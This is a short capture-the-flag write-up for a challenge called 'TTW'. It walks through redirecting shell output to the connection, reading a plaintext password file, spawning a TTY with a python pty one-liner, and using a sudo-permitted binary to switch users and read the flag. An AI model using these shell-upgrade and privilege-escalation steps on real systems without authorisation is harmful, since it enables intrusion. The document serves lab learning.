# TTW

So, what a mess this was. Firstly, we started by performing a timing attack. That managed to get us quite a lot of things, but it was annoying having to wait 5 minutes for some results. So lets look for a better option. Looking at the hint, it says to think about I/O. Hmmm, ok. Connecting through netcat, it prints out "Imagine having a usable terminal". Ok, interesting. If we try and enter in a command, it doesn't output anything. Odd. We can probably assume that all our commands are being sent to `/dev/null`, where they just get wiped away. What if we could trick the connection to redirect our commands anywhere, instead of `/dev/null`. If we know that `2>/dev/null` sends any errors there, we can redirect our output to the input as we're connected there, doing `>&0`. Once we've done some enum, we can use the name of the challenge "TT Why" (sounding like TTY) to spawn a tty shell, where we can run sudo -l (as password.txt has problem-user password) to see that we can run `/usr/bin/chguser` as root. Changing user, navigating to home folder, then to flag, we get flag.txt
```
>ls -alR ./ >&0
message.txt
password.txt
```
```
> cat message.txt
Man, I just sure wish I could impersonate other_user
```
```
> cat password.txt
Password for problem user: 1234qwer
```
```
> python -c 'import pty; pty.spawn("/bin/bash")' >&0
```
```bash
$ sudo -l
(root) /usr/bin/chguser
```
```bash
$ sudo /usr/bin/chguser other-user
Password: 1234qwer
```
```bash
$ ls -alR 
./flag:
flag.txt
```
```bash
$ cat flag/flag.txt
```
#### tjctf{ptys_sure_are_neat}
